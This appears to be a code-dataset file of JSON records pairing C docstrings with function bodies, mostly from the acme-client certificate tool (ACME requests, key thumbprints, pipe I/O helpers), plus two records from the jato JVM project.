{"docstring": "/*\n * If something goes wrong (or we're tracing output), we dump the\n * current transfer's data as a debug message.\n * Make sure that print all non-printable characters as question marks\n * so that we don't spam the console.\n * Also, consolidate white-space.\n * This of course will ruin string literals, but the intent here is just\n * to show the message, not to replicate it.\n */\n", "func_signal": "static void\nbuf_dump(const struct buf *buf)", "code": "{\n\tsize_t\t i;\n\tint\t j;\n\tchar\t*nbuf;\n\n\tif (0 == buf->sz)\n\t\treturn;\n\tif (NULL == (nbuf = malloc(buf->sz)))\n\t\terr(EXIT_FAILURE, \"malloc\");\n\n\tfor (j = 0, i = 0; i < buf->sz; i++)\n\t\tif (isspace((int)buf->buf[i])) {\n\t\t\tnbuf[j++] = ' ';\n\t\t\twhile (isspace((int)buf->buf[i]))\n\t\t\t\ti++;\n\t\t\ti--;\n\t\t} else\n\t\t\tnbuf[j++] = isprint((int)buf->buf[i]) ?\n\t\t\t\tbuf->buf[i] : '?';\n\tdodbg(\"transfer buffer: [%.*s] (%zu bytes)\", j, nbuf, buf->sz);\n\tfree(nbuf);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Request a challenge for the given domain name.\n * This must happen for each name \"alt\".\n * On non-zero exit, fills in \"chng\" with the challenge.\n */\n", "func_signal": "static int\ndochngreq(struct conn *c, const char *alt, struct chng *chng, \n\tconst struct capaths *p, const char *challenge)", "code": "{\n\tint\t\t rc = 0;\n\tchar\t\t*req;\n\tlong\t\t lc;\n\tstruct jsmnn\t*j = NULL;\n\n\tdodbg(\"%s: req-auth: %s\", p->newauthz, alt);\n\n\tif (NULL == (req = json_fmt_newauthz(alt)))\n\t\twarnx(\"json_fmt_newauthz\");\n\telse if ((lc = sreq(c, p->newauthz, req)) < 0)\n\t\twarnx(\"%s: bad comm\", p->newauthz);\n\telse if (200 != lc && 201 != lc)\n\t\twarnx(\"%s: bad HTTP: %ld\", p->newauthz, lc);\n\telse if (NULL == (j = json_parse(c->buf.buf, c->buf.sz)))\n\t\twarnx(\"%s: bad JSON object\", p->newauthz);\n\telse if ( ! json_parse_challenge(j, chng, challenge)) \n\t\twarnx(\"%s: bad challenge\", p->newauthz);\n\telse\n\t\trc = 1;\n\n\tif (0 == rc || verbose > 1)\n\t\tbuf_dump(&c->buf);\n\tjson_free(j);\n\tfree(req);\n\treturn (rc);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Contact dnsproc and resolve a host.\n * Place the answers in \"v\" and return the number of answers, which can\n * be at most MAX_SERVERS_DNS.\n * Return <0 on failure.\n */\n", "func_signal": "static ssize_t\nurlresolve(int fd, const char *host, struct source *v)", "code": "{\n\tchar\t\t*addr;\n\tsize_t\t\t i, sz;\n\tlong\t\t lval;\n\n\tif (writeop(fd, COMM_DNS, DNS_LOOKUP) <= 0)\n\t\treturn (-1);\n\telse if (writestr(fd, COMM_DNSQ, host) <= 0)\n\t\treturn (-1);\n\telse if ((lval = readop(fd, COMM_DNSLEN)) < 0)\n\t\treturn (-1);\n\n\tsz = lval;\n\tassert(sz <= MAX_SERVERS_DNS);\n\n\tfor (i = 0; i < sz; i++) {\n\t\tmemset(&v[i], 0, sizeof(struct source));\n\t\tif ((lval = readop(fd, COMM_DNSF)) < 0)\n\t\t\tgoto err;\n\t\telse if (4 != lval && 6 != lval)\n\t\t\tgoto err;\n\t\telse if (NULL == (addr = readstr(fd, COMM_DNSA)))\n\t\t\tgoto err;\n\t\tv[i].family = lval;\n\t\tv[i].ip = addr;\n\t}\n\n\treturn (sz);\nerr:\n\tfor (i = 0; i < sz; i++)\n\t\tfree(v[i].ip);\n\treturn (-1);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Create and send a signed communication to the ACME server.\n * Stuff the response into the communication buffer.\n * Return <0 on failure on the HTTP error code otherwise.\n */\n", "func_signal": "static long\nsreq(struct conn *c, const char *addr, const char *req)", "code": "{\n\tstruct httpget\t*g;\n\tstruct source\t src[MAX_SERVERS_DNS];\n\tchar\t\t*host, *path, *nonce, *reqsn;\n\tshort\t\t port;\n\tstruct httphead\t*h;\n\tssize_t\t\t ssz;\n\tlong\t\t code;\n\n\tif (NULL == (host = url2host(c->na, &port, &path)))\n\t\treturn (-1);\n\n\tif ((ssz = urlresolve(c->dfd, host, src)) < 0) {\n\t\tfree(host);\n\t\tfree(path);\n\t\treturn (-1);\n\t}\n\n\tg = http_get(c->cfg, src, (size_t)ssz, \n\t\thost, port, path, NULL, 0);\n\tfree(host);\n\tfree(path);\n\tif (NULL == g)\n\t\treturn (-1);\n\n\th = http_head_get(\"Replay-Nonce\", g->head, g->headsz);\n\tif (NULL == h) {\n\t\twarnx(\"%s: no replay nonce\", c->na);\n\t\thttp_get_free(g);\n\t\treturn (-1);\n\t} else if (NULL == (nonce = strdup(h->val))) {\n\t\twarn(\"strdup\");\n\t\thttp_get_free(g);\n\t\treturn (-1);\n\t}\n\thttp_get_free(g);\n\n\t/*\n\t * Send the nonce and request payload to the acctproc.\n\t * This will create the proper JSON object we need.\n\t */\n\n\tif (writeop(c->fd, COMM_ACCT, ACCT_SIGN) <= 0) {\n\t\tfree(nonce);\n\t\treturn (-1);\n\t} else if (writestr(c->fd, COMM_PAY, req) <= 0) {\n\t\tfree(nonce);\n\t\treturn (-1);\n\t} else if (writestr(c->fd, COMM_NONCE, nonce) <= 0) {\n\t\tfree(nonce);\n\t\treturn (-1);\n\t}\n\tfree(nonce);\n\n\t/* Now read back the signed payload. */\n\n\tif (NULL == (reqsn = readstr(c->fd, COMM_REQ)))\n\t\treturn (-1);\n\n\t/* Now send the signed payload to the CA. */\n\n\tif (NULL == (host = url2host(addr, &port, &path))) {\n\t\tfree(reqsn);\n\t\treturn (-1);\n\t} else if ((ssz = urlresolve(c->dfd, host, src)) < 0) {\n\t\tfree(host);\n\t\tfree(path);\n\t\tfree(reqsn);\n\t\treturn (-1);\n\t}\n\n\tg = http_get(c->cfg, src, (size_t)ssz, host,\n\t\tport, path, reqsn, strlen(reqsn));\n\n\tfree(host);\n\tfree(path);\n\tfree(reqsn);\n\tif (NULL == g)\n\t\treturn (-1);\n\n\t/* Stuff response into parse buffer. */\n\n\tcode = g->code;\n\n\tfree(c->buf.buf);\n\tc->buf.sz = g->bodypartsz;\n\tc->buf.buf = malloc(c->buf.sz);\n\tmemcpy(c->buf.buf, g->bodypart, c->buf.sz);\n\thttp_get_free(g);\n\tif (NULL == c->buf.buf) {\n\t\twarn(\"malloc\");\n\t\treturn (-1);\n\t}\n\treturn (code);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Convert an X509 certificate to a buffer of \"sz\".\n * We don't guarantee that it's nil-terminated.\n * Returns NULL on failure.\n */\n", "func_signal": "static char *\nx509buf(X509 *x, size_t *sz)", "code": "{\n\tBIO\t*bio;\n\tchar\t*p;\n\tint\t ssz;\n\n\t/* Convert X509 to PEM in BIO. */\n\n\tif (NULL == (bio = BIO_new(BIO_s_mem()))) {\n\t\twarnx(\"BIO_new\");\n\t\treturn (NULL);\n\t} else if ( ! PEM_write_bio_X509(bio, x)) {\n\t\twarnx(\"PEM_write_bio_X509\");\n\t\tBIO_free(bio);\n\t\treturn (NULL);\n\t}\n\n\t/*\n\t * Now convert bio to string.\n\t * Make into nil-terminated, just in case.\n\t */\n\n\tif (NULL == (p = calloc(1, bio->num_write + 1))) {\n\t\twarn(\"calloc\");\n\t\tBIO_free(bio);\n\t\treturn (NULL);\n\t}\n\n\tssz = BIO_read(bio, p, bio->num_write);\n\tif (ssz < 0 || (unsigned)ssz != bio->num_write) {\n\t\twarnx(\"BIO_read\");\n\t\tBIO_free(bio);\n\t\treturn (NULL);\n\t}\n\n\t*sz = ssz;\n\tBIO_free(bio);\n\treturn (p);\n}", "path": "certproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Here we communicate with the ACME server.\n * For this, we'll need the certificate we want to upload and our\n * account key information.\n */\n", "func_signal": "int\nnetproc(int kfd, int afd, int Cfd, int cfd, int dfd, int rfd,\n\tconst struct config *cfg)", "code": "{\n\tint\t\t rc = 0;\n\tsize_t\t\t i;\n\tchar\t\t*cert = NULL, *thumb = NULL, *url = NULL;\n\tstruct conn\t c;\n\tstruct capaths\t paths;\n\tstruct chng\t*chngs = NULL;\n\tlong\t\t lval;\n\n\tmemset(&paths, 0, sizeof(struct capaths));\n\tmemset(&c, 0, sizeof(struct conn));\n\n\t/*\n\t * FIXME: we do this before pledge()ing because our pledge (and\n\t * chroot) will prevent reading the default certificate.\n\t * However, we should do a pledge before it with \"rpath\", as in\n\t * downstream OpenBSD, but the current framework is too rigid\n\t * for doing so.\n\t * Need to rethink.\n\t */\n\n\tc.cfg = http_init();\n\n\t/* File-system, user, and sandbox jail. */\n\n\tif ( ! sandbox_before()) \n\t\tgoto out;\n\telse if ( ! dropfs(PATH_VAR_EMPTY))\n\t\tgoto out;\n\telse if ( ! dropprivs())\n\t\tgoto out;\n\telse if ( ! sandbox_after(0))\n\t\tgoto out;\n\n\t/*\n\t * Wait until the acctproc, keyproc, and revokeproc have started\n\t * up and are ready to serve us data.\n\t * There's no point in running if these don't work.\n\t * Then check whether revokeproc indicates that the certificate\n\t * on file (if any) can be updated.\n\t */\n\n\tif (0 == (lval = readop(afd, COMM_ACCT_STAT))) {\n\t\trc = 1;\n\t\tgoto out;\n\t} else if (ACCT_READY != lval) {\n\t\twarnx(\"unknown operation from acctproc\");\n\t\tgoto out;\n\t}\n\n\tif (0 == (lval = readop(kfd, COMM_KEY_STAT))) {\n\t\trc = 1;\n\t\tgoto out;\n\t} else if (KEY_READY != lval) {\n\t\twarnx(\"unknown operation from keyproc\");\n\t\tgoto out;\n\t}\n\n\tif (0 == (lval = readop(rfd, COMM_REVOKE_RESP))) {\n\t\trc = 1;\n\t\tgoto out;\n\t} else if (REVOKE_EXP != lval && REVOKE_OK != lval) {\n\t\twarnx(\"unknown operation from revokeproc\");\n\t\tgoto out;\n\t}\n\n\t/* If our certificate is up-to-date, return now. */\n\n\tif (REVOKE_OK == lval) {\n\t\trc = 1;\n\t\tgoto out;\n\t}\n\n\t/* Allocate main state. */\n\n\tchngs = calloc(cfg->altsz, sizeof(struct chng));\n\tif (NULL == chngs) {\n\t\twarn(\"calloc\");\n\t\tgoto out;\n\t}\n\n\tc.dfd = dfd;\n\tc.fd = afd;\n\tc.na = cfg->url;\n\n\tif (NULL == c.cfg)\n\t\tgoto out;\n\n\t/*\n\t * Look up the domain of the ACME server.\n\t * We'll use this ourselves instead of having libcurl do the DNS\n\t * resolution itself.\n\t */\n\tif ( ! dodirs(&c, c.na, &paths))\n\t\tgoto out;\n\n\t/*\n\t * If we're meant to revoke, then wait for revokeproc to send us\n\t * the certificate (if it's found at all).\n\t * Following that, submit the request to the CA then notify the\n\t * certproc, which will in turn notify the fileproc.\n\t */\n\n\tif (cfg->revocate) {\n\t\tif (NULL == (cert = readstr(rfd, COMM_CSR)))\n\t\t\tgoto out;\n\t\tif ( ! dorevoke(&c, paths.revokecert, cert))\n\t\t\tgoto out;\n\t\telse if (writeop(cfd, COMM_CSR_OP, CERT_REVOKE) > 0)\n\t\t\trc = 1;\n\t\tgoto out;\n\t}\n\n\t/* If new, register with the CA server. */\n\n\tif (cfg->newacct && ! donewreg(&c, cfg->agree, &paths))\n\t\tgoto out;\n\n\t/* Pre-authorise all domains with CA server. */\n\n\tfor (i = 0; i < cfg->altsz; i++)\n\t\tif ( ! dochngreq(&c, cfg->alts[i], \n\t\t    &chngs[i], &paths, cfg->challenge))\n\t\t\tgoto out;\n\n\t/*\n\t * We now have our challenges.\n\t * We need to ask the acctproc for the thumbprint.\n\t * We'll combine this to the challenge to create our response,\n\t * which will be orchestrated by the chngproc.\n\t */\n\n\tif (writeop(afd, COMM_ACCT, ACCT_THUMBPRINT) <= 0)\n\t\tgoto out;\n\telse if (NULL == (thumb = readstr(afd, COMM_THUMB)))\n\t\tgoto out;\n\n\t/* We'll now ask chngproc to build the challenge. */\n\n\tfor (i = 0; i < cfg->altsz; i++) {\n\t\tif (writeop(Cfd, COMM_CHNG_OP, CHNG_SYN) <= 0)\n\t\t\tgoto out;\n\t\telse if (writestr(Cfd, COMM_DNSA, cfg->alts[i]) <= 0)\n\t\t\tgoto out;\n\t\telse if (writestr(Cfd, COMM_THUMB, thumb) <= 0)\n\t\t\tgoto out;\n\t\telse if (writestr(Cfd, COMM_TOK, chngs[i].token) <= 0)\n\t\t\tgoto out;\n\n\t\t/* Read that the challenge has been made. */\n\n\t\tif (CHNG_ACK != readop(Cfd, COMM_CHNG_ACK))\n\t\t\tgoto out;\n\n\t\t/* Write to the CA that it's ready. */\n\n\t\tif ( ! dochngresp(&c, &chngs[i], thumb))\n\t\t\tgoto out;\n\t}\n\n\t/*\n\t * We now wait on the ACME server for each domain.\n\t * Connect to the server (assume it's the same server) once\n\t * every five seconds.\n\t */\n\n\tfor (i = 0; i < cfg->altsz; i++) {\n\t\tif (1 == chngs[i].status)\n\t\t\tcontinue;\n\n\t\tif (chngs[i].retry++ >= RETRY_MAX) {\n\t\t\twarnx(\"%s: too many tries\", chngs[i].uri);\n\t\t\tgoto out;\n\t\t}\n\n\t\t/* Sleep before every attempt. */\n\t\tsleep(RETRY_DELAY);\n\t\tif ( ! dochngcheck(&c, &chngs[i]))\n\t\t\tgoto out;\n\t}\n\n\t/*\n\t * Write our acknowledgement that the challenges are over.\n\t * The challenge process will remove all of the files.\n\t */\n\n\tif (writeop(Cfd, COMM_CHNG_OP, CHNG_STOP) <= 0)\n\t\tgoto out;\n\n\t/* Wait to receive the certificate itself. */\n\n\tif (NULL == (cert = readstr(kfd, COMM_CERT)))\n\t\tgoto out;\n\n\t/*\n\t * Otherwise, submit the CA for signing, download the signed\n\t * copy, and ship that into the certificate process for copying.\n\t */\n\n\tif ( ! docert(&c, paths.newcert, cert))\n\t\tgoto out;\n\telse if (writeop(cfd, COMM_CSR_OP, CERT_UPDATE) <= 0)\n\t\tgoto out;\n\telse if (writebuf(cfd, COMM_CSR, c.buf.buf, c.buf.sz) <= 0)\n\t\tgoto out;\n\n\t/*\n\t * Read back the issuer from the certproc.\n\t * Then contact the issuer to get the certificate chain.\n\t * Write this chain directly back to the certproc.\n\t */\n\n\tif (NULL == (url = readstr(cfd, COMM_ISSUER)))\n\t\tgoto out;\n\telse if ( ! dofullchain(&c, url))\n\t\tgoto out;\n\telse if (writebuf(cfd, COMM_CHAIN, c.buf.buf, c.buf.sz) <= 0)\n\t\tgoto out;\n\n\trc = 1;\nout:\n\tclose(cfd);\n\tclose(kfd);\n\tclose(afd);\n\tclose(Cfd);\n\tclose(dfd);\n\tclose(rfd);\n\tfree(cert);\n\tfree(url);\n\tfree(thumb);\n\thttp_uninit(c.cfg);\n\tfree(c.buf.buf);\n\tif (NULL != chngs)\n\t\tfor (i = 0; i < cfg->altsz; i++)\n\t\t\tjson_free_challenge(&chngs[i]);\n\tfree(chngs);\n\tjson_free_capaths(&paths);\n\treturn (rc);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Submit our certificate to the CA.\n * This, upon success, will return the signed CA.\n */\n", "func_signal": "static int\ndocert(struct conn *c, const char *addr, const char *cert)", "code": "{\n\tchar\t*req;\n\tint\t rc = 0;\n\tlong\t lc;\n\n\tdodbg(\"%s: certificate\", addr);\n\n\tif (NULL == (req = json_fmt_newcert(cert)))\n\t\twarnx(\"json_fmt_newcert\");\n\telse if ((lc = sreq(c, addr, req)) < 0)\n\t\twarnx(\"%s: bad comm\", addr);\n\telse if (200 != lc && 201 != lc)\n\t\twarnx(\"%s: bad HTTP: %ld\", addr, lc);\n\telse if (0 == c->buf.sz || NULL == c->buf.buf)\n\t\twarnx(\"%s: empty response\", addr);\n\telse\n\t\trc = 1;\n\n\tif (0 == rc || verbose > 1)\n\t\tbuf_dump(&c->buf);\n\tfree(req);\n\treturn (rc);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * The thumbprint operation is used for the challenge sequence.\n */\n", "func_signal": "static int\nop_thumbprint(int fd, EVP_PKEY *pkey)", "code": "{\n\tchar\t\t*thumb = NULL, *dig64 = NULL;\n\tEVP_MD_CTX\t*ctx = NULL;\n\tunsigned char\t*dig = NULL;\n\tunsigned int\t digsz;\n\tint\t\t rc = 0;\n\n\t/* Construct the thumbprint input itself. */\n\n\tswitch (EVP_PKEY_type(pkey->type)) {\n\tcase EVP_PKEY_RSA:\n\t\tif (NULL != (thumb = op_thumb_rsa(pkey)))\n\t\t\tbreak;\n\t\tgoto out;\n\tdefault:\n\t\twarnx(\"EVP_PKEY_type: unknown key type\");\n\t\tgoto out;\n\t}\n\n\t/*\n\t * Compute the SHA256 digest of the thumbprint then\n\t * base64-encode the digest itself.\n\t * If the reader is closed when we write, ignore it (we'll pick\n\t * it up in the read loop).\n\t */\n\n\tif (NULL == (dig = malloc(EVP_MAX_MD_SIZE))) {\n\t\twarn(\"malloc\");\n\t\tgoto out;\n\t} else if (NULL == (ctx = EVP_MD_CTX_create())) {\n\t\twarnx(\"EVP_MD_CTX_create\");\n\t\tgoto out;\n\t} else if ( ! EVP_DigestInit_ex(ctx, EVP_sha256(), NULL)) {\n\t\twarnx(\"EVP_SignInit_ex\");\n\t\tgoto out;\n\t} else if ( ! EVP_DigestUpdate(ctx, thumb, strlen(thumb))) {\n\t\twarnx(\"EVP_SignUpdate\");\n\t\tgoto out;\n\t} else if ( ! EVP_DigestFinal_ex(ctx, dig, &digsz)) {\n\t\twarnx(\"EVP_SignFinal\");\n\t\tgoto out;\n\t} else if (NULL == (dig64 = base64buf_url((char *)dig, digsz))) {\n\t\twarnx(\"base64buf_url\");\n\t\tgoto out;\n\t} else if (writestr(fd, COMM_THUMB, dig64) < 0)\n\t\tgoto out;\n\n\trc = 1;\nout:\n\tif (NULL != ctx)\n\t\tEVP_MD_CTX_destroy(ctx);\n\n\tfree(thumb);\n\tfree(dig);\n\tfree(dig64);\n\treturn (rc);\n}", "path": "acctproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Converts a BIGNUM to the form used in JWK.\n * This is essentially a base64-encoded big-endian binary string\n * representation of the number.\n */\n", "func_signal": "static char *\nbn2string(const BIGNUM *bn)", "code": "{\n\tint\t len;\n\tchar\t*buf, *bbuf;\n\n\t/* Extract big-endian representation of BIGNUM. */\n\n\tlen = BN_num_bytes(bn);\n\tif (NULL == (buf = malloc(len))) {\n\t\twarn(\"malloc\");\n\t\treturn (NULL);\n\t} else if (len != BN_bn2bin(bn, (unsigned char *)buf)) {\n\t\twarnx(\"BN_bn2bin\");\n\t\tfree(buf);\n\t\treturn (NULL);\n\t}\n\n\t/* Convert to base64url. */\n\n\tif (NULL == (bbuf = base64buf_url(buf, len))) {\n\t\twarnx(\"base64buf_url\");\n\t\tfree(buf);\n\t\treturn (NULL);\n\t}\n\n\tfree(buf);\n\treturn (bbuf);\n}", "path": "acctproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Make sure that the given process exits properly, i.e., properly\n * exiting with EXIT_SUCCESS.\n * Returns non-zero on success and zero on failure.\n */\n", "func_signal": "int\ncheckexit(pid_t pid, enum comp comp)", "code": "{\n\tint\t\t c, cc;\n\tconst char\t*cp;\n\n\tif (-1 == waitpid(pid, &c, 0)) {\n\t\twarn(\"waitpid\");\n\t\treturn (0);\n\t} else if ( ! WIFEXITED(c) && WIFSIGNALED(c)) {\n\t\tcp = strsignal(WTERMSIG(c));\n\t\twarnx(\"signal: %s(%u): %s\", comps[comp], pid, cp);\n\t\treturn (0);\n\t} else if ( ! WIFEXITED(c)) {\n\t\twarnx(\"did not exit: %s(%u)\", comps[comp], pid);\n\t\treturn (0);\n\t} else if (EXIT_SUCCESS != WEXITSTATUS(c)) {\n\t\tcc = WEXITSTATUS(c);\n\t\tdodbg(\"bad exit: %s(%u): %d\", comps[comp], pid, cc);\n\t\treturn (0);\n\t}\n\n\treturn (1);\n}", "path": "util.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * This will read a long-sized operation.\n * Operations are usually enums, so this should be alright.\n * We return 0 on EOF and LONG_MAX on failure.\n */\n", "func_signal": "long\nreadop(int fd, enum comm comm)", "code": "{\n\tssize_t\t\t ssz;\n\tlong\t\t op;\n\n\tssz = read(fd, &op, sizeof(long));\n\tif (ssz < 0) {\n\t\twarn(\"read: %s\", comms[comm]);\n\t\treturn (LONG_MAX);\n\t} else if (ssz && ssz != sizeof(long)) {\n\t\twarnx(\"short read: %s\", comms[comm]);\n\t\treturn (LONG_MAX);\n\t} else if (0 == ssz)\n\t\treturn (0);\n\n\treturn (op);\n}", "path": "util.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Wring a long-value to a communication pipe.\n * Returns 0 if the reader has terminated, -1 on error, 1 on success.\n */\n", "func_signal": "int\nwriteop(int fd, enum comm comm, long op)", "code": "{\n\tvoid\t(*sigfp)(int);\n\tssize_t\t ssz;\n\tint\t er;\n\n\tsigfp = signal(SIGPIPE, sigpipe);\n\n\tif ((ssz = write(fd, &op, sizeof(long))) < 0) {\n\t\tif (EPIPE != (er = errno))\n\t\t\twarn(\"write: %s\", comms[comm]);\n\t\tsignal(SIGPIPE, sigfp);\n\t\treturn (EPIPE == er ? 0 : -1);\n\t}\n\n\tsignal(SIGPIPE, sigfp);\n\n\tif ((size_t)ssz != sizeof(long)) {\n\t\twarnx(\"short write: %s\", comms[comm]);\n\t\treturn (-1);\n\t}\n\n\treturn (1);\n}", "path": "util.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Request the full chain certificate.\n */\n", "func_signal": "static int\ndofullchain(struct conn *c, const char *addr)", "code": "{\n\tint\t rc = 0;\n\tlong\t lc;\n\n\tdodbg(\"%s: full chain\", addr);\n\n\tif ((lc = nreq(c, addr)) < 0)\n\t\twarnx(\"%s: bad comm\", addr);\n\telse if (200 != lc && 201 != lc)\n\t\twarnx(\"%s: bad HTTP: %ld\", addr, lc);\n\telse\n\t\trc = 1;\n\n\tif (0 == rc || verbose > 1)\n\t\tbuf_dump(&c->buf);\n\treturn (rc);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Send a \"regular\" HTTP GET message to \"addr\" and stuff the response\n * into the connection buffer.\n * Return the HTTP error code or <0 on failure.\n */\n", "func_signal": "static long\nnreq(struct conn *c, const char *addr)", "code": "{\n\tstruct httpget\t*g;\n\tstruct source\t src[MAX_SERVERS_DNS];\n\tchar\t\t*host, *path;\n\tshort\t\t port;\n\tsize_t\t\t srcsz;\n\tssize_t\t\t ssz;\n\tlong\t\t code;\n\n\tif (NULL == (host = url2host(addr, &port, &path)))\n\t\treturn (-1);\n\n\tif ((ssz = urlresolve(c->dfd, host, src)) < 0) {\n\t\tfree(host);\n\t\tfree(path);\n\t\treturn (-1);\n\t}\n\tsrcsz = ssz;\n\n\tg = http_get(c->cfg, src, srcsz, host, port, path, NULL, 0);\n\tfree(host);\n\tfree(path);\n\tif (NULL == g)\n\t\treturn (-1);\n\n\tcode = g->code;\n\n\t/* Copy the body part into our buffer. */\n\n\tfree(c->buf.buf);\n\tc->buf.sz = g->bodypartsz;\n\tc->buf.buf = malloc(c->buf.sz);\n\tmemcpy(c->buf.buf, g->bodypart, c->buf.sz);\n\thttp_get_free(g);\n\tif (NULL == c->buf.buf) {\n\t\twarn(\"malloc\");\n\t\treturn (-1);\n\t}\n\treturn (code);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Fully write the given buffer.\n * Returns 0 if the reader has terminated, -1 on error, 1 on success.\n */\n", "func_signal": "int\nwritebuf(int fd, enum comm comm, const void *v, size_t sz)", "code": "{\n\tssize_t\t ssz;\n\tint\t er, rc = -1;\n\tvoid\t(*sigfp)(int);\n\n\t/*\n\t * First, try to write the length.\n\t * If the other end of the pipe has closed, we allow the short\n\t * write to propogate as a return value of zero.\n\t * To detect this, catch SIGPIPE.\n\t */\n\n\tsigfp = signal(SIGPIPE, sigpipe);\n\n\tif ((ssz = write(fd, &sz, sizeof(size_t))) < 0) {\n\t\tif (EPIPE != (er = errno))\n\t\t\twarn(\"write: %s length\", comms[comm]);\n\t\tsignal(SIGPIPE, sigfp);\n\t\treturn (EPIPE == er ? 0 : -1);\n\t}\n\n\t/* Now write errors cause us to bail. */\n\n\tif ((size_t)ssz != sizeof(size_t))\n\t\twarnx(\"short write: %s length\", comms[comm]);\n\telse if ((ssz = write(fd, v, sz)) < 0)\n\t\twarn(\"write: %s\", comms[comm]);\n\telse if ((size_t)ssz != sz)\n\t\twarnx(\"short write: %s\", comms[comm]);\n\telse\n\t\trc = 1;\n\n\tsignal(SIGPIPE, sigfp);\n\treturn (rc);\n}", "path": "util.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Read a buffer from the sender.\n * This consists of two parts: the lenght of the buffer, and the buffer\n * itself.\n * We allow the buffer to be binary, but nil-terminate it anyway.\n */\n", "func_signal": "char *\nreadbuf(int fd, enum comm comm, size_t *sz)", "code": "{\n\tssize_t\t\t ssz;\n\tsize_t\t\t rsz, lsz;\n\tchar\t\t*p = NULL;\n\n\tif ((ssz = read(fd, sz, sizeof(size_t))) < 0) {\n\t\twarn(\"read: %s length\", comms[comm]);\n\t\treturn (NULL);\n\t} else if ((size_t)ssz != sizeof(size_t)) {\n\t\twarnx(\"short read: %s length\", comms[comm]);\n\t\treturn (NULL);\n\t} else if (*sz > SIZE_MAX - 1) {\n\t\twarnx(\"integer overflow\");\n\t\treturn (NULL);\n\t} else if (NULL == (p = calloc(1, *sz + 1))) {\n\t\twarn(\"malloc\");\n\t\treturn (NULL);\n\t}\n\n\t/* Catch this over several reads. */\n\n\trsz = 0;\n\tlsz = *sz;\n\twhile (lsz) {\n\t\tif ((ssz = read(fd, p + rsz, lsz)) < 0) {\n\t\t\twarn(\"read: %s\", comms[comm]);\n\t\t\tbreak;\n\t\t} else if (ssz > 0) {\n\t\t\tassert((size_t)ssz <= lsz);\n\t\t\trsz += (size_t)ssz;\n\t\t\tlsz -= (size_t)ssz;\n\t\t}\n\t}\n\n\tif (lsz) {\n\t\twarnx(\"couldn't read buffer: %s\", comms[comm]);\n\t\tfree(p);\n\t\treturn (NULL);\n\t}\n\n\treturn (p);\n}", "path": "util.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Extract the relevant RSA components from the key and create the JSON\n * thumbprint from them.\n */\n", "func_signal": "static char *\nop_thumb_rsa(EVP_PKEY *pkey)", "code": "{\n\tchar\t*exp = NULL, *mod = NULL, *json = NULL;\n\tRSA\t*r;\n\n\tif (NULL == (r = EVP_PKEY_get1_RSA(pkey)))\n\t\twarnx(\"EVP_PKEY_get1_RSA\");\n\telse if (NULL == (mod = bn2string(r->n)))\n\t\twarnx(\"bn2string\");\n\telse if (NULL == (exp = bn2string(r->e)))\n\t\twarnx(\"bn2string\");\n\telse if (NULL == (json = json_fmt_thumb_rsa(exp, mod)))\n\t\twarnx(\"json_fmt_thumb_rsa\");\n\n\tfree(exp);\n\tfree(mod);\n\treturn (json);\n}", "path": "acctproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/* Return the address of the ld.so allocated common symbol\t*/\n/* with the least address, or 0 if none.\t\t\t*/\n", "func_signal": "static ptr_t GC_first_common()", "code": "{\n    ptr_t result = 0;\n    extern struct link_dynamic _DYNAMIC;\n    struct rtc_symb * curr_symbol;\n    \n    if( &_DYNAMIC == 0) {\n        return(0);\n    }\n    curr_symbol = _DYNAMIC.ldd -> ldd_cp;\n    for (; curr_symbol != 0; curr_symbol = curr_symbol -> rtc_next) {\n        if (result == 0\n            || (ptr_t)(curr_symbol -> rtc_sp -> n_value) < result) {\n            result = (ptr_t)(curr_symbol -> rtc_sp -> n_value);\n        }\n    }\n    return(result);\n}", "path": "boehmgc\\dyn_load.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* @arg must be in the format package/name/Class.method(Lsignature;)V */\n", "func_signal": "static void handle_trace_method(const char *arg)", "code": "{\n\topt_trace_method = true;\n\tregex_compile(&method_trace_regex, arg);\n}", "path": "jato.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
